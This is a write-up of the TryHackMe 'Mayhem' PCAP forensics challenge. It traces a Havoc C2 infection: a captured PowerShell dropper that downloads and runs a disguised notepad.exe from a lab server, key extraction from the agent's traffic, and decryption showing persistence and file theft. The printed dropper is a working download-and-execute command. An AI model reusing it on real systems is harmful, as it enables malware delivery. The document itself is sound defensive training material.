---
title: "TryHackMe: Mayhem Write-up"
date: 2025-07-12 14:00:00
categories: [TryHackMe, Challenges]
tag: [pcap analysis, havoc-c2-framework]
---

[TryHackme Room](https://tryhackme.com/room/mayhemroom)

## Objective:

Find the flag inside a PCAP file

## View the Conversations

<img width="1920" height="964" alt="Screenshot_2025-07-12_08_51_53" src="https://github.com/user-attachments/assets/d0a4487c-4433-4767-bc13-d636f3d52413" />

There are 6 TCP streams; we will view all of them and search for interesting findings.

## Stream 0 && 1

<img width="1920" height="964" alt="Screenshot_2025-07-12_09_04_47" src="https://github.com/user-attachments/assets/81752be2-f61f-4d88-9000-afecdf287010" />
<img width="1920" height="964" alt="Screenshot_2025-07-12_09_04_59" src="https://github.com/user-attachments/assets/c4c140cc-d962-4ed0-b25d-98e501ce5280" />

Both streams, the source `10.0.2.38` established a TCP handshake, but closed the connection immediately without sending any payloads.

## Stream-2

<img width="1920" height="964" alt="Screenshot_2025-07-12_09_01_49" src="https://github.com/user-attachments/assets/b9d85b7d-4712-4fc0-9103-519dd5bfec34" />

The client `10.0.2.38` sends a PowerShell script request to download a file called `install.ps1` from a web server running on port `1337` at `10.0.2.37`.

**install.ps1**

```powershell
$aysXS8Hlhf = "<http://10.0.2.37:1337/notepad.exe>";
$LA4rJgSPpx = "C:\\Users\\paco\\Downloads\\notepad.exe";
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
$65lmAtnzW8 = New-Object System.Net.WebClient;
$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
Start-Process -Filepath $LA4rJgSPpx

```

The PowerShell scripts download `notepad.exe` from `10.0.2.37:1337`, and save it to the Downloads folder in the **paco** user, then execute the file immediately with Start-Process. Now let's look in the stream 3 to see if the `notepad.exe` actually delivered. 

## Stream-3

<img width="1920" height="964" alt="Screenshot_2025-07-12_09_50_45" src="https://github.com/user-attachments/assets/b68844c5-0f7f-49a3-88f0-1db22bc2158a" />

The PowerShell script from stream 2 successfully fetched and downloaded a binary executable (`notepad.exe`) over HTTP from a custom Python server. The server replied with the binary file. To export the binary, go to **File > Export Objects > HTTP**, search for `notepad.exe`, and save it.

<img width="916" height="418" alt="image" src="https://github.com/user-attachments/assets/f0c65151-3717-4598-95f0-5c756c515b6f" />

```bash
file notepad.bin
notepad.bin: PE32+ executable for MS Windows 5.02 (GUI), x86-64 (stripped to external PDB), 6 sections
md5sum notepad.bin
a13daa35fd7b873f87379a94b97168e2  notepad.bin

```

<img width="1172" height="501" alt="image" src="https://github.com/user-attachments/assets/d06dbeb3-7af8-4769-85a4-7fd365cdf053" />

This confirms that the binary (`notepad.exe`) is a Trojan malware. Upon reading the community comments, this looks like an open-source post-exploitation framework → [HavocFramework](https://github.com/HavocFramework). 

## Stream-5

Stream 4 was the same as stream 3 since the request for the binary was made twice.

<img width="1920" height="964" alt="Screenshot_2025-07-12_10_16_44" src="https://github.com/user-attachments/assets/b603fc3b-8b03-4851-ba40-ed76057d5cd7" />

In stream 5, this is Command and Control (C2) and exfiltration traffic generated by the Trojan binary. 

## Obtaining the encryption keys from packet capture

Referred to this article -> [havoc-c2-framework-a-defensive-operators-guide](https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide), it shows how to detect and find the encryption keys and how to decrypt the traffic

In the **Obtaining the encryption keys from packet capture”** section of the article, it states that we need to search for the magic value, which is **0xDEADBEEF.** From there, we will be able to find the **agent ID**, **agent length**, **IV key**, and **AES key**, which will aid us in the decryption process.

<img width="991" height="448" alt="Screenshot 2025-07-12 220145" src="https://github.com/user-attachments/assets/6375819c-d20d-493b-aa57-685f73b4ee1f" />

> In the article, it also noted: "The encryption keys appear to be sent in the first non-check-in HTTP POST request from the agent to the teamserver*"*. Based on that, I filtered the packet for the hex values `dead beef`, searched for the first HTTP POST that `dead beef` in it, and I found it on frame number 182.
> 

<img width="1920" height="964" alt="Screenshot_2025-07-12_15_41_45" src="https://github.com/user-attachments/assets/c232e53c-f435-457e-a7e8-46d6b1a6fcdf" />

Copy the frame as a hex stream, then start extracting the encryption keys.

```
0800270f20780800271dca5a08004500013fc02e4000800600000a0002260a000225e003005033964057b39a416650182014197c000000000113deadbeef0e9fb7d80000006300000000946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca8cd00c3e349290565aaa5a8c3aacd430340cd2bc567802a30e1c2722bb2135dbfe9b76cc0f486e975aaf1f21a6ad13f9ef282131470a0191c974b4f5c2369005227811dcfb9708192e358fe9dfbf4214760291da15237a0f2e5db5b1e718d48ef01af5e724767c95a1b5c136cc744d75edcb1747847d1b6a22df5a23531442b73329c2b2ae46e1ab2506f548bd1b706892c6d4b8c66c206b0a668752ef7203b3e7627cb2fa5677998779347a00d75cadc5e60d67f78e4cbe1318e8d738475d774ae18dbb6ee25e0a3c3255dfe2b0fc3e220e87fd3a5c7bba8ed1df272387b57fd836f0

```

- before deadbeef, count 4 bytes -> **agent length**.
- after the deadbeef, skip two bytes, and take the next two bytes -> **Agent ID**
- after agent id, skip 8 bytes, and take the next 32 bytes -> **AES KEY**
- after AES KEY, count the next 16 bytes -> **IV key**
- as for the mode, it was identified from the [AesCrypt.h](https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/include/crypt/AesCrypt.h#L6) -> **CTR**

**Encryption Keys:**

```
AES KEY: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
IV key: 8cd00c3e349290565aaa5a8c3aacd430
Mood: CTR

```

## Decrypting traffic

Copy the rest of the data after the IV key and paste it in CyberChef to test the decryption.

<img width="1649" height="811" alt="Screenshot 2025-07-12 234624" src="https://github.com/user-attachments/assets/65f54df1-8f70-4cb4-b1cb-597e28af2121" />

To decrypt the remaining packets, we need to examine each HTTP packet individually. However, there appears to be a pattern:

- The client's packet consistently has a length of 74 bytes.
- The server's response consistently has a length of 182 bytes.

<img width="1232" height="539" alt="image" src="https://github.com/user-attachments/assets/ea25e295-0555-46f6-95fe-5987a4f1c6fd" />

These values repeat multiple times, and upon inspection, the contents appear to be empty or do not contain any meaningful data.

Based on that, we will look for the frames that have a length other than 74 and 182. Starting from frame length of 111, copy the data as a hex stream and paste it into CyberChef. If it didn't return readable data, that means it’s not starting at a clean offset; we need to skip some header bytes.

<img width="1915" height="900" alt="Screenshot 2025-07-13 002005" src="https://github.com/user-attachments/assets/5505a28e-081f-43dd-b46a-f457686c55e2" />

Moving to the next frame, which has a length of 5835, copy it as a hex stream and paste it in CyberChef.
If the data isn't readable, even with the 24-byte set to drop, we need to drop more bytes. Next, look for the `deadbeef` header and remove it from the beginning of the hex. Repeat this process with the rest of the packets

<img width="1918" height="879" alt="Screenshot 2025-07-13 002237" src="https://github.com/user-attachments/assets/b91da333-8024-4ae5-94aa-be46a9774c1f" />

packet length of 237, it worked just by setting the 24-byte drop.

<img width="1579" height="888" alt="Screenshot 2025-07-13 102547" src="https://github.com/user-attachments/assets/1fbf76ed-a142-4f26-8aae-926001dd1860" />

<img width="1654" height="809" alt="Screenshot 2025-07-13 103359" src="https://github.com/user-attachments/assets/315a8567-94a1-40ce-9e56-a25a7a96870b" />

The attacker added an account to the **local administrators** group to gain persistence.

<img width="1578" height="793" alt="Screenshot 2025-07-13 104436" src="https://github.com/user-attachments/assets/8b1ab8e4-d90a-4306-ab22-cbf4b28f7fe3" />
<img width="1579" height="776" alt="Screenshot 2025-07-13 105009" src="https://github.com/user-attachments/assets/c8d20696-e643-46c1-a46a-e33faf4c4711" />

He was also able to find an important file in the target's desktop folder.

<img width="1615" height="846" alt="Screenshot 2025-07-13 105806" src="https://github.com/user-attachments/assets/af05f883-1788-4da5-8154-8749d114ca50" />

This is whats inside the client.csv file:

<img width="1706" height="887" alt="Screenshot 2025-07-13 110055" src="https://github.com/user-attachments/assets/f6c782ab-fbef-453f-b911-a92809d1b244" />
